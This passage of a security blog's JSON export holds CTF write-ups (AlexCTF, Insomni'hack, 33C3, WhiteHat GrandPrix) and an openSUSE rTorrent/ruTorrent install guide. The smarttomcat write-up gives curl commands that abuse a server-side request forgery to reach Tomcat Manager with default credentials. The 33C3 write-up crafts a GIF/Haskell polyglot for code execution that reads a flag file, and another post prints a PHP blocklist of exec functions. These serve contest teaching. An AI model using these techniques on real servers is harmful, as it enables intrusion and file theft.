falsewhile line = s.gets # Read lines from the socket puts line.chop # And print with platform line terminator raw += line if raw.match(/=$/) &amp;&amp; flag == false calc = raw.match(/^([0-9]*) ([+\\-%*\\/]) ([0-9]*) =/) a = calc.captures[0].to_i oper = calc.captures[1] b = calc.captures[2].to_i if oper == '+' res = a + b elsif oper == '-' res = a - b elsif oper == '*' res = a * b elsif oper == '%' res = a % b elsif oper == '/' res = a / b else puts \"That's not good...\" end if res != nil puts res s.puts res end res = nil raw = '' endends.close # Close the socket when done Note: I chose not to use some exec function because I don't trust external entries. Here an example of output and the flag: 12345678910111213141516171819202122232425262728293031 __________ ______/ ________ \\______ _/ ____________ \\_ _/____________ ____________\\_ / ___________ \\ / ___________ \\ / /XXXXXXXXXXX\\ \\/ /XXXXXXXXXXX\\ \\ / /############/ \\############\\ \\ | \\XXXXXXXXXXX/ _ _ \\XXXXXXXXXXX/ |__|\\_____ ___ // \\\\ ___ _____/|__[_ \\ \\ X X / / _]__| \\ \\ / / |__[____ \\ \\ \\ ____________ / / / ____] \\ \\ \\ \\/||.||.||.||.||\\/ / / / \\_ \\ \\ ||.||.||.||.|| / / _/ \\ \\ ||.||.||.||.|| / / \\_ ||_||_||_||_|| _/ \\ ........ / \\________________/Our system system has detected human traffic from your IP!Please prove you are a botQuestion 1 :188284398378183198274310077338361 - 222311858895894501436877647952618 =[...]Question 250 :198932319558549559940672382195244 % 276981013309967153730940955239195 =Well no human got time to solve 500 ridiculous math challengesCongrats MR bot!Tell your human operator flag is: ALEXCTF&#123;1_4M_l33t_b0t&#125;","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"Insomni'hack teaser - 50 - cryptoquizz - Misc","slug":"Insomnihack-2017-Teaser-cryptoquizz","date":"2017-01-20T23:00:00.000Z","updated":"2017-02-07T18:23:36.685Z","comments":true,"path":"en/Insomnihack-2017-Teaser-cryptoquizz/","link":"","permalink":"https://rawsec.ml/en/Insomnihack-2017-Teaser-cryptoquizz/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : Insomni'hack teaser 2017 Website : teaser.insomnihack.ch Type : Online Format : Jeopardy CTF Time : link Description cryptoquizz - Misc/Crypto - 50 pts - realized by cryptopathe Hello, young hacker. Are you ready to fight rogue machines ? Now, you'll have to prove us that you are a genuine cryptographer. Running on quizz.teaser.insomnihack.ch:1031 Solution Goal: In this challenge, a server a get us a name (of a famous cryptographer) and we have to find his/her birth year. Then we must send the year to the server and do it again for others cryptographers until we get the flag. To find the year of someone famous it is possible to use the Wikimedia API. I tried the API sandbox and figured that it was difficult to use it manually. The wikimedia API works for all the Wikimedia Fundation entities, for example: Wikipedia, Wikidata,... As we only want the birt year of the cryptographer we should prefer to use Wikidata instead of wikipedia, there is less data to parse. As I like ruby for scripting, I chose to use a ruby gem: a Wikidata API Client named wikidata-client. Here is the documentation. Fist I only looked for the first person of the result. But I had soem wrong asnwer. Because the server is giving wrong or partial name. For example the server give Ross Anderson but there are: Ross Anderson an alpine skier Ross Anderson a swimmer Ross J. Anderson a computer scientist, cryptographer Another example is the server also giving diminutive or nickname like Ron Rivest for Ronald Rivest. This is not a problem for Ronald but with Jim Massey this is. There is a cryptographer named James Lee Massey and his nickname Jimmy Massey and the diminutive of Jimmy is Jim. Problem is that the real Jim Massey is a comics writer and the server is giving a diminutive of a nickname of James Lee Massey... So I had to create a homonym avoidance by checking the occupation of the person but this function takes too much time as it needs more requests and regex. So I finally disabled this function because it was making my requests timed out. So I had to run my script several and have the luck not to search for ambiguous name and to finally get the flag. Here is my ruby script: 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/rubyrequire 'socket'require 'wikidata'hostname = 'quizz.teaser.insomnihack.ch'port = 1031s = TCPSocket.open(hostname, port)raw = ''flag = falsefind = falsewhile line = s.gets # Read lines from the socket puts line.chop # And print with platform line terminator raw += line if raw.match(/~~ What/) &amp;&amp; flag == false name = raw.match(/^~~ What is the birth year of ([a-zA-Z\\s\\-\\.]*) ?/).captures[0] name = name[0...-1] search = Wikidata::Item.search \"#&#123;name&#125;\" if search.empty? == false while find == false man = search.results.first #occupation = man.properties('P106').to_s #if occupation.match(/crypto/) || occupation.match(/computer/) if true # homonym avoidance take to much time birth_year = man.date_of_birth.date.year puts \"#&#123;name&#125;: #&#123;birth_year&#125;\" s.puts birth_year raw = '' find = true else puts \"shift\" search.results.shift # remove first item of the array end end find = false # for the next search end endends.close # Close the socket when done Here is the output of the script: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/Insomnihack/Teaser/2017]$ ruby cryptoquizz.rb~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Hello, young hacker. Are you ready to fight rogue machines ? ~~~~ Now, you&apos;ll have to prove us that you are a genuine ~~~~ cryptographer. ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ What is the birth year of Nigel P. Smart ?Nigel P. Smart: 1967~~ What is the birth year of Don Coppersmith ?Don Coppersmith: 1950~~ What is the birth year of Niels Ferguson ?Niels Ferguson: 1965~~ What is the birth year of Mihir Bellare ?Mihir Bellare: 1962~~ What is the birth year of Amos Fiat ?Amos Fiat: 1956~~ What is the birth year of Wang Xiaoyun ?Wang Xiaoyun: 1966~~ What is the birth year of Eli Biham ?Eli Biham: 1960~~ What is the birth year of Martin Hellman ?Martin Hellman: 1945~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ OK, young hacker. You are now considered to be a ~~~~ INS&#123;GENUINE_CRYPTOGRAPHER_BUT_NOT_YET_A_PROVEN_SKILLED_ONE&#125; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Flag was: INS{GENUINE_CRYPTOGRAPHER_BUT_NOT_YET_A_PROVEN_SKILLED_ONE}. Opinion: I don't kniw if cryptopathe (challenge's author) did it on purpose to make it harder or did it unintentionally because he/she didn't checked his/her challenge and used a crappy data set, but giving wrong, partial, diminutive, nickname is very problematic for searches. I think this is not a well written challenge.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/tags/misc/"}]},{"title":"Insomni'hack teaser - 50 - smarttomcat - Web","slug":"Insomnihack-2017-Teaser-smarttomcat","date":"2017-01-20T23:00:00.000Z","updated":"2017-02-07T18:23:36.685Z","comments":true,"path":"en/Insomnihack-2017-Teaser-smarttomcat/","link":"","permalink":"https://rawsec.ml/en/Insomnihack-2017-Teaser-smarttomcat/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : Insomni'hack teaser 2017 Website : teaser.insomnihack.ch Type : Online Format : Jeopardy CTF Time : link Description smarttomcat - Web - 50 pts - realized by xel/grimmlin Normal, regular cats are so 2000 and late, I decided to buy this allegedly smart tomcat robot Now the damn thing has attacked me and flew away. I can't even seem to track it down on the broken search interface... Can you help me ? Search interface Solution We have a web application like this: Let's take a look at sources, there is some JavaScript: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253[...]&lt;script&gt;var map = new OpenLayers.Map(\"map\");map.addLayer(new OpenLayers.Layer.OSM());var lonlat = new OpenLayers.LonLat(15.2833,-4.2667).transform(new OpenLayers.Projection(\"EPSG:4326\"),map.getProjectionObject());var zoom = 10;var markers = new OpenLayers.Layer.Markers( \"Markers\" );map.addLayer(markers);var center_marker = new OpenLayers.Marker(lonlat);markers.addMarker(center_marker);map.setCenter(lonlat,zoom);var request;$('#findcatbycoord').submit(function(event)&#123; event.preventDefault(); if (request) &#123; request.abort(); &#125; var cat_coords = 'http://localhost:8080/index.jsp?x=' + parseFloat($('#xcoord').val()) + '&amp;y=' + parseFloat($('#ycoord').val()); var $form = $(this); var $inputs = $form.find('input, select, button, textarea'); $inputs.prop('disabled', true); request = $.ajax(&#123; url: '/index.php', type: 'post', success: function(data) &#123; markers.clearMarkers(); while(map.popups.length) &#123;map.removePopup(map.popups[0]);&#125; var y = parseFloat($('#ycoord').val()); var x = parseFloat($('#xcoord').val()); if (isNaN(y) || isNaN(x)) &#123;y = 15.2833; x = -4.2667;&#125; lonlat = new OpenLayers.LonLat(y,x).transform(new OpenLayers.Projection(\"EPSG:4326\"),map.getProjectionObject()); center_marker = new OpenLayers.Marker(lonlat); markers.addMarker(center_marker); popup = new OpenLayers.Popup.FramedCloud(\"popup\", lonlat, null, data, null, true); map.addPopup(popup); map.setCenter(lonlat,zoom); &#125;, data: &#123; u: cat_coords &#125; &#125;); request.always(function () &#123; $inputs.prop('disabled', false); &#125;);&#125;);&lt;/script&gt;[...] The interesting line is: var cat_coords = 'http://localhost:8080/index.jsp?x=' + parseFloat($('#xcoord').val()) + '&amp;y=' + parseFloat($('#ycoord').val());. So we have one web serve that is a proxy for a web application. We can see in http headers that the front-end server is Apache/2.4.18 (Ubuntu). The description is suggesting we have a Tomcat web app. In the javascript we can see var map = new OpenLayers.Map(&quot;map&quot;); and OpenLayers is a class of GeoServer. What do we have? Front-end: Apache/2.4.18 (Ubuntu) Back-end: Apache Tomcat/7.0.68 (Ubuntu) Map-core: GeoServer In the javascript we also see if (isNaN(y) || isNaN(x)) {y = 15.2833; x = -4.2667;} that means the browser won't let us send anything else than numbers in the form. We should use Hackbar or curl. What to do now? We guessed this is a Tomcat web app so let's find the Tomcat Manager (administration panel for Tomcat web server). A normal request (POST data) would be: 1u=http://localhost:8080/index.jsp?x=42%26y=1337 With curl: 12&amp; curl --data &quot;u=http://localhost:8080/index.jsp?x=42%26y=1337&quot; http://smarttomcat.teaser.insomnihack.ch/Tomcat not found ! Try again Now let's try to reach the Tomcat Manager page which is usually: http://example.org:8180/manager/html. Here we have the manager also running on port 8080. So with curl: 12&amp; curl --data &quot;u=http://127.0.0.1:8080/manager/html/&quot; http://smarttomcat.teaser.insomnihack.ch/&lt;html&gt;&lt;head&gt;&lt;title&gt;Apache Tomcat/7.0.68 (Ubuntu) - Error report&lt;/title&gt;&lt;style&gt;&lt;!--H1 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;&#125; H2 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;&#125; H3 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;&#125; BODY &#123;font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;&#125; B &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;&#125; P &#123;font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;&#125;A &#123;color : black;&#125;A.name &#123;color : black;&#125;HR &#123;color : #525D76;&#125;--&gt;&lt;/style&gt; &lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 401 - &lt;/h1&gt;&lt;HR size=&quot;1&quot; noshade=&quot;noshade&quot;&gt;&lt;p&gt;&lt;b&gt;type&lt;/b&gt; Status report&lt;/p&gt;&lt;p&gt;&lt;b&gt;message&lt;/b&gt; &lt;u&gt;&lt;/u&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;description&lt;/b&gt; &lt;u&gt;This request requires HTTP authentication.&lt;/u&gt;&lt;/p&gt;&lt;HR size=&quot;1&quot; noshade=&quot;noshade&quot;&gt;&lt;h3&gt;Apache Tomcat/7.0.68 (Ubuntu)&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;% With hackbar: We can see the following error: HTTP Status 401: This request requires HTTP authentication. This is because we should provide some Basic Auth informations. Default credentials of Tomcat Manager are tomcat:tomcat. So the http header for authentification should be Authorization: Basic dG9tY2F0OnRvbWNhdA==. The option to pass basic authentification to curl is -u but doing the following command won't work: 1$ curl -u tomcat:tomcat --data &quot;u=http://127.0.0.1:8080/manager/html/&quot; http://smarttomcat.teaser.insomnihack.ch/ Because this will provide the authentification to the Apache front-end instead of giving it to the proxyfied Tomcat Manager running on the back-end. But it's possible to directly provide credentials for basic autentification in the URL, for example: http://user:pass@example.org. Let's do it: 12$ curl --data &quot;u=http://tomcat:tomcat@127.0.0.1:8080/manager/html/&quot; http://smarttomcat.teaser.insomnihack.ch/We won&apos;t give you the manager, but you can have the flag : INS&#123;th1s_is_re4l_w0rld_pent3st&#125; The flag was: INS{th1s_is_re4l_w0rld_pent3st}. No need to find the coordinates.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"OpenSUSE : Install rTorrent and ruTorrent","slug":"opensuse-install-rtorrent-rutorrent","date":"2016-12-29T23:00:00.000Z","updated":"2017-02-07T18:23:36.855Z","comments":true,"path":"en/opensuse-install-rtorrent-rutorrent/","link":"","permalink":"https://rawsec.ml/en/opensuse-install-rtorrent-rutorrent/","excerpt":"","text":"Install rTorrent, git ang nginx: 1# zypper install rtorrent git nginx Warning: rtorrent package in official openSUSE repository is not compiled with xmlrpc so you won't be able to use it with rutorrent. Add the php devel repository to be able to install php7: 123# zypper addrepo http://download.opensuse.org/repositories/devel:languages:php/openSUSE_Leap_42.1/devel:languages:php.repo# zypper refresh# zypper install php7 php7-fpm Go to the default web folder and clone the ruTorrent git repository: 12$ cd /srv/www/htdocs/# git clone https://github.com/Novik/ruTorrent.git rutorrent Enable and start nginx: 12# systemctl enable nginx.service# systemctl start nginx.service Open php configuration: 1# vim /etc/php7/cli/php.ini Disable php exposure (expose_php): 1expose_php = Off Enable file uploads (file_uploads): 1file_uploads = On Set the maximum size of an uploaded file (upload_max_filesize): 1upload_max_filesize = 15M Set max size of post data allowed (post_max_size): 1post_max_size = 15M Set the timezone (date.timezone). For more security, limit the files that can be accessed by php (open_basedir): 1open_basedir = /srv/www/htdocs/rutorrent Change the value of cgi.fix_pathinfo to zero for security reasons: 1cgi.fix_pathinfo=0 Save and quit php.ini. Create the php-fpm.conf and www.conf files: 12# cp /etc/php7/fpm/php-fpm.conf.default /etc/php7/fpm/php-fpm.conf# cp /etc/php7/fpm/php-fpm.d/www.conf.default /etc/php7/fpm/php-fpm.d/www.conf Edit the php-fpm configuration: 1# vim /etc/php7/fpm/php-fpm.conf To enable php-fpm log, uncomment this line (the default prefix is /var): 1error_log = log/php-fpm.log Edit the php-fpm pool file: 1# vim /etc/php7/fpm/php-fpm.d/www.conf Configure the owner of the nginx process to the Nginx user: 12user = nginxgroup = nginx Configure php-fpm to run under a socket file, not a port: 1listen = /var/run/php-fpm.sock Change the permissions for the unix socket to the nginx user, group and mode: 123listen.owner = nginxlisten.group = nginxlisten.mode = 0660 Enable and start php-fpm: 12# systemctl enable php-fpm# systemctl start php-fpm Create an authentification folder for nginx: 1# mkdir /etc/nginx/auth Create the virtual servers directories: 12# mkdir /etc/nginx/servers-available# mkdir /etc/nginx/servers-enabled Edit the nginx configuration file: 1# vim /etc/nginx/nginx.conf And add this config: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152user nginx;worker_processes auto;pid /var/run/nginx.pid;events &#123; worker_connections 1024; multi_accept on; use epoll;&#125;http &#123; charset UTF-8; ## # Basic Settings ## server_names_hash_bucket_size 64; sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; server_tokens off; # server_name_in_redirect off; include /etc/nginx/mime.types; default_type application/octet-stream; ## # Logging Settings ## access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; ## # Gzip Settings ## gzip on; gzip_disable &quot;msie6&quot;; gzip_vary on; gzip_proxied any; gzip_comp_level 6; gzip_buffers 16 8k; gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; ## # Virtual Host Configs ## include /etc/nginx/servers-enabled/*;&#125; Save and quit. Create the server domain config: 1# vim /etc/nginx/servers-available/seedbox.conf And add the config: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566server &#123; listen 80; listen [::]:80; # Redirect all HTTP requests to HTTPS with a 301 Moved Permanently response. return 301 https://$host$request_uri;&#125;### BLOCK SERVEUR HTTPS##server &#123; # http2 not supported by nginx 1.8.1 listen 443 ssl; server_name seedbox.domain.example.org; root /srv/www/htdocs/rutorrent; index index.php index.html index.htm;### SSL## ssl_certificate /etc/nginx/ssl/seedbox.crt; ssl_certificate_key /etc/nginx/ssl/seedbox.key; ssl_protocols TLSv1.2; ssl_ciphers EECDH+CHACHA20:EECDH+AESGCM:EECDH+AES; ssl_ecdh_curve secp384r1; ssl_prefer_server_ciphers on; # ssl optimizations ssl_session_timeout 5m; ssl_session_cache shared:SSL:20m; ssl_session_tickets on;### SECURITY## add_header X-XSS-Protection &quot;1; mode=block&quot;; auth_basic &quot;Restricted Area&quot;; auth_basic_user_file &quot;/etc/nginx/auth/seedbox_auth&quot;;### PHP## location / &#123; index index.php index.html index.htm; try_files $uri $uri/ /index.php?$args; &#125; location ~ \\.php$ &#123; try_files $uri =404; fastcgi_split_path_info ^(.+\\.php)(/.+)$; fastcgi_pass unix:/var/run/php-fpm.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125; location ^~ /conf/ &#123; deny all; &#125; location ^~ /share/ &#123; deny all; &#125;&#125; Don’t forget to change server_name seedbox.domain.example.org; with your own domain and create a CNAME entry in your DNS configuration. Enable the server: 1# ln -s /etc/nginx/servers-available/seedbox.conf /etc/nginx/servers-enabled/seedbox.conf To configure a self-signed certificate, add the certificate folder: 1# mkdir /etc/nginx/ssl Generate self-signed certificate: 1234# cd /etc/nginx/ssl# openssl ecparam -genkey -name secp384r1 -out seedbox.key# openssl req -new -key seedbox.key -sha256 -out seedbox.csr# openssl req -x509 -days 3650 -sha256 -key seedbox.key -in seedbox.csr -out seedbox.crt Modify files rights: 12# chmod 644 /etc/nginx/ssl/*.crt# chmod 640 /etc/nginx/ssl/*.key Create an user: 12# useradd --shell /bin/bash --create-home sdbox# passwd sdbox Create needed folder for rtorrent: 1# mkdir -p /home/sdbox/&#123;torrents,watch,.session&#125; Create rtorrent config file: 1# vim /home/sdbox/.rtorrent.rc Paste the config: 1234567891011121314151617181920scgi_port = 127.0.0.1:5001encoding_list = UTF-8port_range = 45000-65000port_random = nocheck_hash = nodirectory = /home/sdbox/torrentssession = /home/sdbox/.sessionencryption = allow_incoming, try_outgoing, enable_retryschedule = watch_directory,1,1,&quot;load_start=/home/sdbox/watch/*.torrent&quot;schedule = untied_directory,5,5,&quot;stop_untied=/home/sdbox/watch/*.torrent&quot;use_udp_trackers = yesdht = offpeer_exchange = nomin_peers = 40max_peers = 100min_peers_seed = 10max_peers_seed = 50max_uploads = 15execute = &#123;sh,-c,/usr/bin/php /srv/www/htdocs/rutorrent/php/initplugins.php sdbox &amp;&#125;schedule = espace_disque_insuffisant,1,30,close_low_diskspace=500M Give user permissions: 123# chown --recursive sdbox:users /home/sdbox# chown root:root /home/sdbox# chmod 755 /home/sdbox Edit the virtual server config: 1# vim /etc/nginx/servers-available/seedbox.conf Add the config: 1234567location /SDBOX&#123; include scgi_params; scgi_pass 127.0.0.1:5001; auth_basic &quot;Restricted Area&quot;; auth_basic_user_file &quot;/etc/nginx/auth/seedbox_auth sdbox&quot;;&#125; In order to do not install apache-tools, manually generate the auth file for sdbox user (it will write over the file and don’t forget to change the password in the command): 1$ echo -n &quot;sdbox:&quot; | sudo tee /etc/nginx/auth/seedbox_auth &amp;&amp; openssl passwd -apr1 password | sudo tee -a /etc/nginx/auth/seedbox_auth Protect the authentification file: 12# chmod 600 /etc/nginx/auth/seedbox_auth# chown nginx:nginx /etc/nginx/auth/* Create ruTorrent config file: 12# mkdir /srv/www/htdocs/rutorrent/conf/users/sdbox# vim /srv/www/htdocs/rutorrent/conf/users/sdbox/config.php And add the content: 12345678&lt;?php$pathToExternals[&apos;curl&apos;] = &apos;/usr/bin/curl&apos;;$topDirectory = &apos;/home/sdbox&apos;;$scgi_port = 5001;$scgi_host = &apos;127.0.0.1&apos;;$XMLRPCMountPoint = &apos;/SDBOX&apos;;$tempDirectory = &apos;/srv/www/htdocs/rutorrent/tmp/&apos;; Correct permissions: 123# chown -R nginx:nginx /srv/www/htdocs/rutorrent# chmod 0777 /srv/www/htdocs/rutorrent/share/&#123;settings,torrents,users&#125;# systemctl restart nginx.service Enable user lingering: 1# loginctl enable-linger sdbox To create a rTorrent service, create the file /etc/systemd/system/rtorrent.service containing: 123456789101112131415[Unit]Description=rTorrent DaemonAfter=network.target[Service]Type=forkingKillMode=noneUser=sdboxExecStart=/usr/bin/tmux new-session -c /mnt/storage/rtorrent -s rtorrent -n rtorrent -d rtorrentExecStop=/usr/bin/bash -c &quot;/usr/bin/tmux send-keys -t rtorrent C-q &amp;&amp; while pidof rtorrent &gt; /dev/null; do sleep 0.5; done&quot;WorkingDirectory=/home/sdbox/Restart=on-failure[Install]WantedBy=multi-user.target Enable rtorrent at boot time and manually start it: 12# systemctl enable rtorrent# systemctl start rtorrent To allow web traffic trought the firewall, create this file: 1# vim /etc/sysconfig/SuSEfirewall2.d/services/httpd And add this config: 12345## Name: Web server## Description: opens ports for web servers in order to allow http and https traffic# space separated list of allowed TCP portsTCP=&quot;80 443&quot; Now add the httpd config in the global settings: 1# vim /etc/sysconfig/SuSEfirewall2 And add httpd to FW_CONFIGURATIONS_EXT, for example FW_CONFIGURATIONS_EXT=&quot;sshd httpd&quot;. Now restart the firewall: 123# systemctl restart SuSEfirewall2.serviceor# rcSuSEfirewall2 restart","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"},{"name":"opensuse","slug":"linux/opensuse","permalink":"https://rawsec.ml/categories/linux/opensuse/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"https://rawsec.ml/tags/system/"},{"name":"opensuse","slug":"opensuse","permalink":"https://rawsec.ml/tags/opensuse/"}]},{"title":"33C3 CTF - 150 - try - Web","slug":"C3CTF-33-150-try-web","date":"2016-12-27T23:00:00.000Z","updated":"2017-02-07T18:23:36.842Z","comments":true,"path":"en/C3CTF-33-150-try-web/","link":"","permalink":"https://rawsec.ml/en/C3CTF-33-150-try-web/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : 33C3 CTF Website : 33c3ctf.ccc.ac Type : Online Format : Jeopardy CTF Time : link Description &quot;I never try anything, I just do it!&quot; Do Flag is in /challenge/flag Solution Home page looks like this (need to log in with just a pseudo): On the profil page we can upload a profil picture (only gif): You can't use easy trick to upload any files except gif: no double or triple extensions no MIME type changing not just the GIF file header 47 49 46 38 37 61 (GIF87a) + GIF file trailer 00 3B (;) -- see file signatures You have to upload the nearly full skeleton of the GIF picture. But you can use a web proxy (like burpsuite) and append whatever you want at the end of the GIF. As the website seems to execute Haskell algorithms, I tried to append some haskell code. hello world (just to confirm haskell execution): 1main = putStrLn \"hello world\" But just now we want to know where is uploaded our profil picture. It's embedded in the heading and have a location like this http://78.46.224.73/static/33c3_50fc0c1d-e04a-4942-9fc8-8921e4e83e6e/pic.gif. Note: path is unpredictable and file is renamed. What to do now? Try to execute it. On the home page when you want to run some of the examples, you can see with a web proxy that the file to execute is up to you: A legitimate run file is run_file=fib.hs. If you try the download link you can see that this haskell script is hosted at http://78.46.224.73/static/fib.hs. Just remember that our picture is located at http://78.46.224.73/static/33c3_50fc0c1d-e04a-4942-9fc8-8921e4e83e6e/pic.gif. So what happen if we change it to run_file=33c3_50fc0c1d-e04a-4942-9fc8-8921e4e83e6e/pic.gif and if we append some haskell code at the end of the picture? Unfortunatly this lead to an error: lexical error at character '\\SOH' (with the tiniest GIF) or lexical error (UTF-8 decoding error) (with a real GIF) So we conclude that the interpreter try to execute the bytecode of the GIF image. Unfortunatly we are not able to upload only haskell. To limit error possibilities we tried to upload one of the tiniest GIF and replaced 0x01 (SOF) with 0x00 (null) but the website doesn't allow that. I think we have to upload a GIF file and neutralize GIF data. Then I read an excellent article talking about how to store javascript code in a GIF, so I tried to do the same with a haskell comment. In haskell comments (ref) are like this: -- a single line comment {- A multiline comment which can continue for many lines -} ASCII Hex { 0x7b } 0x7d - 0x2d A legitimate minimalistic GIF would be: 123$ xxd handtinyblack.gif00000000: 4749 4638 3961 0100 0100 00ff 002c 0000 GIF89a.......,..00000010: 0000 0100 0100 0002 003b .........; Our malicious GIF with haskell comment and appended code would be: 12345$ xxd vuln.gif00000000: 4749 4638 3961 7b2d 0100 0100 00ff 002c GIF89a&#123;-.......,00000010: 0000 0000 0100 0100 0002 003b 2d7d 0a6d ...........;-&#125;.m00000020: 6169 6e20 3d20 7075 7453 7472 4c6e 2022 ain = putStrLn &quot;00000030: 6865 6c6c 6f20 776f 726c 6422 0a hello world&quot;. But again we have an error: Parse error: naked expression at top level. Perhaps you intended to use TemplateHaskell So we want to change GIF89a from an expression to a variable or a function, but the problem is that in haskell functions can't begin with an uppercase letter, only data constructor can. So we can't begin with something like GIF89a :: Integer and if we begin with somethin else than GIF89a the image is not recognized as valid. All the difficulty is about crafting a valid haskell code beginning with GIF89a. I went to the official Haskell IRC and asked for this question, the trick is to start the file with a pattern matching and declare it later (ref). 1234567$ xxd vuln2.gif00000000: 4749 4638 3961 203d 2047 4946 3839 617b GIF89a = GIF89a&#123;00000010: 2d01 0001 0000 ff00 2c00 0000 0001 0001 -.......,.......00000020: 0000 0200 3b2d 7d0a 6461 7461 2047 4946 ....;-&#125;.data GIF00000030: 3839 6120 3d20 4749 4638 3961 0a6d 6169 89a = GIF89a.mai00000040: 6e20 3d20 7075 7453 7472 4c6e 2022 6865 n = putStrLn &quot;he00000050: 6c6c 6f20 776f 726c 6422 0a llo world&quot;. That works now! So now we will just switch the hello world program to somethinf reading the flag folder (we need native function because we can't use import as it needs to be at the beginning of the file in the heading section): 123main = do contents &lt;- readFile \"/challenge/flag\" print $ contents","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"WhiteHat GrandPrix - 100 - Banh can - Web","slug":"WhiteHat-GrandPrix-2016-web-100-banh-can","date":"2016-12-16T23:00:00.000Z","updated":"2017-02-07T18:23:36.722Z","comments":true,"path":"en/WhiteHat-GrandPrix-2016-web-100-banh-can/","link":"","permalink":"https://rawsec.ml/en/WhiteHat-GrandPrix-2016-web-100-banh-can/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : WhiteHat GrandPrix 2016 Website : grandprix.whitehatvn.com Type : Online Format : Jeopardy CTF Time : link Description http://web04.grandprix.whitehatvn.com http://bakweb04.grandprix.whitehatvn.com:8118 Powered by People Security Academic - PSA Solution TL;DR: Incomplete write-up. Here is the home page: Check the source code: 1234567What's your name? I just want to say hello :)&lt;form&gt; &lt;input name=\"hello\" value=\"\" /&gt; &lt;button type=\"submit\"&gt;Send&lt;/button&gt;&lt;/form&gt;&lt;!-- function hint() --&gt; So let's try the hint function: http://web04.grandprix.whitehatvn.com/?hint=. 123$blacklist = array(\"system\", \"passthru\", \"exec\", \"read\", \"open\", \"eval\", \"backtick\", \"`\", \"_\");die(\"No no no hackers!!\"); Submit","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"WhiteHat GrandPrix - 100 - Banh bot loc - Web","slug":"WhiteHat-GrandPrix-2016-web-100-banh-bot-loc","date":"2016-12-16T23:00:00.000Z","updated":"2017-02-07T18:23:36.722Z","comments":true,"path":"en/WhiteHat-GrandPrix-2016-web-100-banh-bot-loc/","link":"","permalink":"https://rawsec.ml/en/WhiteHat-GrandPrix-2016-web-100-banh-bot-loc/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF 